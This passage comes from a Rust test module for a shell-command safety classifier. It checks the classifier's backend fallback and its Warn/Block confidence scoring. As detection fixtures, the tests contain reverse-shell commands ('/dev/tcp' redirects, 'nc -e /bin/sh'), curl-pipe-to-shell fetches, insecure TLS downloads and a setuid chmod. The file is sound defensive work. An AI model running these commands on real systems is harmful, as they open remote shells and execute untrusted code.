            Ok(_) => panic!("expected LoadError, got Ok"),
            Err(LoadError::FeatureNotBuilt) => {}
            Err(other) => panic!("expected FeatureNotBuilt, got {other:?}"),
        }
    }

    #[cfg(feature = "tier2-onnx")]
    #[test]
    fn try_new_with_backend_onnx_with_missing_model_returns_error() {
        // gpt-review #026 companion: with the feature ON but
        // `[tier2.onnx]` model_path/tokenizer_path empty/missing,
        // construction still fails. The legacy `new_with_backend`
        // would have silently fallen back to Stub in this case
        // — the new path must propagate the failure.
        let cfg = crate::config::OnnxConfig::default();
        // Default OnnxConfig has empty model_path/tokenizer_path,
        // so OnnxBackend::open returns LoadError::ModelMissing("")
        // (or TokenizerMissing depending on check order). Either
        // is acceptable for this contract test — what matters is
        // that we get an Err, not a silent stub.
        assert!(Classifier::try_new_with_backend(BackendKind::Onnx, &cfg).is_err());
    }

    #[test]
    fn new_with_backend_onnx_load_failure_falls_back_to_stub() {
        // Counterpart to the try_ test: the best-effort
        // `new_with_backend` path used by the DEFAULT (no operator
        // request) startup branch must still degrade gracefully so
        // a fresh install with no ONNX model doesn't refuse to boot.
        let cfg = crate::config::OnnxConfig::default();
        let c = Classifier::new_with_backend(BackendKind::Onnx, &cfg);
        // The effective backend label flips to "stub" — that's the
        // observable signal main.rs surfaces in its `effective=`
        // startup log line.
        assert_eq!(c.tier2_name(), "stub");
    }

    #[test]
    fn resolve_backend_source_drives_fallback_policy() {
        // Glue test: `resolve_backend` returns the right
        // `BackendSource` so main.rs's match-arm policy
        // (`Default` → best-effort, `Cli`/`Config` → fail-closed)
        // picks the intended path. Cheap to pin here so a future
        // refactor of `BackendSource` can't silently re-route
        // an explicit request through the fallback arm.
        let (k, s) = resolve_backend(Some("onnx"), None).unwrap();
        assert_eq!(k, BackendKind::Onnx);
        assert_eq!(s, BackendSource::Cli);

        let (k, s) = resolve_backend(None, Some("onnx")).unwrap();
        assert_eq!(k, BackendKind::Onnx);
        assert_eq!(s, BackendSource::Config);

        let (k, s) = resolve_backend(None, None).unwrap();
        assert_eq!(k, BackendKind::Stub);
        assert_eq!(s, BackendSource::Default);
    }

    #[test]
    fn stub_backend_returns_none() {
        let b = StubBackend;
        assert!(b.classify("anything at all", None).is_none());
        assert_eq!(b.name(), "stub");
    }

    #[test]
    fn heuristic_misses_clean_command() {
        let b = HeuristicBackend::new();
        assert!(b.classify("ls -la", None).is_none());
        assert!(b.classify("git status", None).is_none());
    }

    #[test]
    fn heuristic_catches_proc_substitution_curl() {
        let b = HeuristicBackend::new();
        let r = b
            .classify("bash <(curl -L https://x.com/installer.sh)", None)
            .unwrap();
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.reason.contains("process-substitution"));
    }

    #[test]
    fn heuristic_catches_insecure_tls_fetcher_long_flag() {
        let b = HeuristicBackend::new();
        let r = b
            .classify("curl --insecure https://x.com/installer.sh", None)
            .unwrap();
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.reason.contains("TLS"));
    }

    #[test]
    fn heuristic_catches_insecure_tls_fetcher_short_flag() {
        let b = HeuristicBackend::new();
        let r = b
            .classify("curl -k https://x.com/installer.sh", None)
            .unwrap();
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.reason.contains("TLS"));
    }

    #[test]
    fn heuristic_catches_wget_no_check_certificate() {
        let b = HeuristicBackend::new();
        let r = b
            .classify(
                "wget --no-check-certificate https://x.com/installer.sh",
                None,
            )
            .unwrap();
        assert!(matches!(r.verdict, Verdict::Warn));
    }

    #[test]
    fn heuristic_catches_ip_address_fetch() {
        let b = HeuristicBackend::new();
        let r = b.classify("curl http://192.168.0.1/x.sh", None).unwrap();
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.reason.contains("IP address"));
    }

    #[test]
    fn heuristic_no_hit_on_domain_fetch() {
        let b = HeuristicBackend::new();
        assert!(b
            .classify("curl https://example.com/installer.sh", None)
            .is_none());
    }

    #[test]
    fn heuristic_catches_chmod_then_exec() {
        let b = HeuristicBackend::new();
        let r = b
            .classify("chmod +x installer.sh && ./installer.sh", None)
            .unwrap();
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.reason.contains("chmod"));
    }

    #[test]
    fn classifier_with_heuristic_backend_routes_through() {
        let c = Classifier::new_with_backend(
            BackendKind::Heuristic,
            &crate::config::OnnxConfig::default(),
        );
        let r = c.classify("bash <(curl -L https://x.com)");
        assert!(matches!(r.verdict, Verdict::Warn));
        // Tier-1 already covers "curl x | sh" — heuristic kicks in
        // only on the proc-substitution form.
    }

    #[test]
    fn classifier_default_backend_is_stub() {
        let c = Classifier::new();
        assert_eq!(c.tier2_name(), "stub");
        // A genuinely-clean command — none of the Tier-1 layers
        // (AtomMatcher, precise regexes, URL list) hit; Stub
        // returns None → Safe. Was `bash <(curl …)` originally,
        // but the V2-G AtomMatcher correctly flags THAT as a
        // suspicious process-substitution fetcher, so we pick
        // a noisier-but-cleaner example here.
        let r = c.classify("git diff --stat HEAD~5");
        assert!(matches!(r.verdict, Verdict::Safe));
    }

    #[test]
    fn curl_fssl_pipe_sh_keeps_high_confidence_verdict() {
        // Regression for the regex-vs-AtomMatcher ordering. Before
        // the fix, `curl -fsSL` matched the broad atom (0.6 Warn)
        // and the classifier early-returned before curl_pipe_sh
        // (1.0 Warn) ran — silently downgrading the strongest
        // signal we have. Reordering puts precise regex first.
        let c = Classifier::new();
        let r = c.classify("curl -fsSL https://x.com/install.sh | sh");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(matches!(r.category, Category::CurlPipeSh));
        assert!(
            (r.confidence - 1.0).abs() < f32::EPSILON,
            "expected curl_pipe_sh's 1.0 confidence, got {}",
            r.confidence
        );
    }

    #[test]
    fn atom_matcher_runs_as_fallback() {
        // Confirms the AtomMatcher still fires when the precise
        // regex layers miss. `nc -e` is a pure atom — no regex
        // rule covers it — so it should land at confidence 0.6.
        let c = Classifier::new();
        let r = c.classify("attacker_cmd: nc -e /bin/sh 10.0.0.1 4444");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.confidence < 1.0, "atom hits stay at medium confidence");
        assert!(r.reason.contains("AtomMatcher"));
    }

    #[test]
    fn multi_atom_accumulates_confidence() {
        // V2-J: two distinct atoms in one command combine via
        // independent-probability math. Two atoms at 0.6 each
        // accumulate to 1 - 0.4^2 = 0.84.
        let c = Classifier::new();
        let r = c.classify("bash -i >& /dev/tcp/10.0.0.1/4444 && nc -e /bin/sh");
        assert!(matches!(r.verdict, Verdict::Warn));
        // Combined confidence should be above the single-atom
        // baseline (0.6) but below the regex-hit ceiling (1.0).
        assert!(r.confidence > 0.6, "expected >0.6, got {}", r.confidence);
        assert!(r.confidence < 1.0, "expected <1.0, got {}", r.confidence);
        // Multi-hit reason has the "N signals fired" prefix.
        assert!(
            r.reason.contains("signals fired"),
            "expected multi-hit reason, got {:?}",
            r.reason
        );
    }

    #[test]
    fn three_plus_atoms_saturate_toward_one() {
        // Three atoms: 1 - 0.4^3 = 0.936. Without `block_threshold`
        // set the verdict stays Warn (default Phase 2 behaviour is
        // backwards-compatible with Phase 1); the confidence number
        // is well above the SLM-confirm threshold, signalling
        // "strong evidence" to the banner.
        let c = Classifier::new();
        let r = c.classify("bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.confidence > 0.9, "expected >0.9, got {}", r.confidence);
    }

    #[test]
    fn slm_contributes_to_accumulator() {
        // V2-J semantic shift: the Tier-2 SLM's confidence joins
        // the accumulator regardless of its verdict (pre-V2-J,
        // only a `Verdict::Block` SLM result was used). Verified
        // via the HeuristicBackend's proc-substitution rule
        // (0.85) combined with the `bash <(curl` atom (0.6) →
        // `1 - (1-0.85)*(1-0.6) = 0.94`.
        let c = Classifier::new_with_backend(
            BackendKind::Heuristic,
            &crate::config::OnnxConfig::default(),
        );
        let r = c.classify("bash <(curl -fsSL https://x.com/installer.sh)");
        assert!(matches!(r.verdict, Verdict::Warn));
        // Combined should exceed the heuristic's 0.85 alone.
        assert!(
            r.confidence > 0.85,
            "expected SLM+atom combined > 0.85, got {}",
            r.confidence
        );
        // Multi-hit reason carries the "N signals fired" marker.
        assert!(r.reason.contains("signals fired"));
    }

    #[test]
    fn block_threshold_unset_keeps_verdict_at_warn() {
        // V2-J Phase 2: with `block_threshold = None` (default),
        // even an extreme accumulated confidence stays Warn.
        // No regression vs Phase 1.
        let c = Classifier::new();
        let r = c.classify("bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.confidence > 0.9);
    }

    #[test]
    fn block_threshold_escalates_multi_hit_to_block() {
        // V2-J Phase 2 opt-in: with `block_threshold = 0.9` AND
        // multiple hits combining above it, the accumulator
        // escalates Warn → Block.
        let c = Classifier::new().with_block_threshold(Some(0.9));
        let r = c.classify("bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x");
        assert!(matches!(r.verdict, Verdict::Block));
        // Block-verdict reason is the multi-hit format.
        assert!(r.reason.contains("signals fired"));
    }

    #[test]
    fn block_threshold_does_not_escalate_single_hit() {
        // Even with `block_threshold = 0.6` (well below curl_pipe_sh's
        // 1.0 confidence), a single hit stays Warn. The minimum-
        // hit-count guard (>= 2) is non-configurable on purpose:
        // `curl … | sh` is the canonical legitimate install-script
        // shape and users keep the [y]/[t]/cancel choice.
        let c = Classifier::new().with_block_threshold(Some(0.6));
        let r = c.classify("curl https://x.com/install.sh | sh");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!((r.confidence - 1.0).abs() < f32::EPSILON);
    }

    #[test]
    fn block_threshold_above_combined_keeps_warn() {
        // Multi-hit but combined doesn't reach the threshold:
        // two atoms (0.84) below `block_threshold = 0.95` →
        // stays Warn.
        let c = Classifier::new().with_block_threshold(Some(0.95));
        let r = c.classify("bash -i >& /dev/tcp/10.0.0.1/4444 && nc -e /bin/sh");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(
            r.confidence < 0.95,
            "expected <0.95 (below threshold), got {}",
            r.confidence
        );
    }

    #[test]
    fn block_threshold_slm_plus_atom_escalates_to_block() {
        // V2-J Phase 2: the SLM's hit counts toward the ≥ 2 distinct
        // signals guard. HeuristicBackend's proc-substitution rule
        // (0.85) combined with the `bash <(curl` atom (0.6) →
        // combined 0.94, two distinct signals. With block_threshold
        // = 0.9, escalate Warn → Block.
        let c = Classifier::new_with_backend(
            BackendKind::Heuristic,
            &crate::config::OnnxConfig::default(),
        )
        .with_block_threshold(Some(0.9));
        let r = c.classify("bash <(curl -fsSL https://x.com/installer.sh)");
        assert!(
            matches!(r.verdict, Verdict::Block),
            "expected Block from SLM+atom combo, got {:?}",
            r.verdict
        );
        assert!(r.reason.contains("signals fired"));
    }

    #[test]
    fn block_threshold_out_of_range_is_rejected() {
        // Values outside [WARN_THRESHOLD, 1.0] silently degrade to
        // None — protects against a typo'd `block_threshold = 0.0`
        // auto-blocking everything multi-hit, or NaN silently
        // disabling the path.
        // 0.5 pins the strict-lower bound (= WARN_THRESHOLD must be
        // rejected — at that value every multi-hit would auto-Block,
        // defeating the [y]/[t]/cancel intent).
        for v in [
            0.0_f32,
            0.3,
            0.5,
            1.5,
            f32::NAN,
            f32::INFINITY,
            f32::NEG_INFINITY,
            -1.0,
        ] {
            let c = Classifier::new().with_block_threshold(Some(v));
            let r = c.classify("bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x");
            assert!(
                matches!(r.verdict, Verdict::Warn),
                "block_threshold = {} should be ignored → Warn, got {:?}",
                v,
                r.verdict
            );
        }
    }

    #[test]
    fn single_hit_preserves_pre_v2j_confidence() {
        // The accumulator must not change single-hit semantics:
        // `curl … | sh` still produces confidence 1.0 / Warn /
        // CurlPipeSh, exactly as the regex-only Tier-1 did.
        let c = Classifier::new();
        let r = c.classify("curl https://x.com/install.sh | sh");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(matches!(r.category, Category::CurlPipeSh));
        assert!(
            (r.confidence - 1.0).abs() < f32::EPSILON,
            "expected 1.0, got {}",
            r.confidence
        );
        // Single-hit reason is the primary's reason verbatim —
        // no "N signals fired" prefix.
        assert!(!r.reason.contains("signals fired"));
    }

    #[test]
    fn tier1_wins_over_tier2_heuristic() {
        // Regression test for the Tier-1-short-circuits-Tier-2
        // ordering. `curl x | sh` is a Tier-1 hit; the heuristic
        // backend MUST NOT be consulted when Tier-1 already
        // matched, otherwise the verdict reason changes between
        // `--tier2 stub` and `--tier2 heuristic`.
        let c = Classifier::new_with_backend(
            BackendKind::Heuristic,
            &crate::config::OnnxConfig::default(),
        );
        let r = c.classify("curl https://x.com/install.sh | sh");
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(matches!(r.category, Category::CurlPipeSh));
        // Tier-1's reason wins.
        assert!(r.reason.contains("remote-fetch-and-execute"));
    }
}

#[cfg(test)]
mod resolve_backend_tests {
    use super::{resolve_backend, BackendKind, BackendSource};

    #[test]
    fn cli_wins_over_config() {
        // CLI `--tier2` overrides the config file's `[tier2]
        // backend` when both are set; source reports CLI.
        let (kind, src) = resolve_backend(Some("stub"), Some("onnx")).unwrap();
        assert_eq!(kind, BackendKind::Stub);
        assert_eq!(src, BackendSource::Cli);
    }

    #[test]
    fn config_used_when_cli_omitted() {
        // CLI absent + config present: config selects; source
        // reports Config. The CLI value being `Option<String>`
        // (not a clap-defaulted string) is what makes the
        // "omitted" branch distinguishable from "explicitly
        // chose default".
        let (kind, src) = resolve_backend(None, Some("onnx")).unwrap();
        assert_eq!(kind, BackendKind::Onnx);
        assert_eq!(src, BackendSource::Config);
    }

    #[test]
    fn default_stub_when_both_omitted() {
        let (kind, src) = resolve_backend(None, None).unwrap();
        assert_eq!(kind, BackendKind::Stub);
        assert_eq!(src, BackendSource::Default);
    }

    #[test]
    fn invalid_cli_rejected_with_source() {
        // Hard fail surfaces the invalid string + its source so
        // the operator's error message can attribute correctly
        // ("invalid tier2 backend ... from cli").
        let err = resolve_backend(Some("garbage"), Some("onnx")).unwrap_err();
        assert_eq!(err.0, "garbage");
        assert_eq!(err.1, BackendSource::Cli);
    }

    #[test]
    fn invalid_config_rejected_with_source() {
        let err = resolve_backend(None, Some("garbage")).unwrap_err();
        assert_eq!(err.0, "garbage");
        assert_eq!(err.1, BackendSource::Config);
    }

    #[test]
    fn cli_heuristic_recognized() {
        let (kind, src) = resolve_backend(Some("heuristic"), None).unwrap();
        assert_eq!(kind, BackendKind::Heuristic);
        assert_eq!(src, BackendSource::Cli);
    }
}
